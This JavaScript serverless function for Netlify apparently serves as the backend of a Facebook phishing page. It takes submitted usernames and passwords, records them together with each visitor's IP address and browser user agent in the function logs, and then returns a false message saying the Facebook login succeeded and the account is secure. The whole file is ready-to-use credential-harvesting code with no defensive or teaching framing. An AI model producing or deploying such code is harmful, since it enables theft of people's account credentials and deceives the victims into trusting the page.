exports.handler = async (event, context) => {
  // Only allow POST requests
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: "Method Not Allowed" }),
    };
  }

  // 1. Get the raw form body: e.g. "username=john&password=1234"
  const rawBody = event.body || "";

  // 2. Parse it manually (no extra packages needed)
  const formData = {};
  rawBody.split("&").forEach((pair) => {
    const [key, value] = pair.split("=");
    formData[key] = decodeURIComponent(value || "");
  });

  // 3. Extract relevant info
  const username = formData.username || "";
  const password = formData.password || "";

  // 4. Get IP and User-Agent from headers
  const ipAddress = event.headers["x-forwarded-for"] || "Unknown IP";
  const userAgent = event.headers["user-agent"] || "Unknown User-Agent";

  // 5. Log it so you can see it in Netlify’s Function logs
  console.log("Login attempt:", { username, password, ipAddress, userAgent });

  // 6. Respond with your custom success message
  return {
    statusCode: 200,
    // This JSON is what the browser receives
    body: JSON.stringify({
      message: "Your Facebook login successfully, and your Facebook is secure, you can now close your tab."
    }),
  };
};
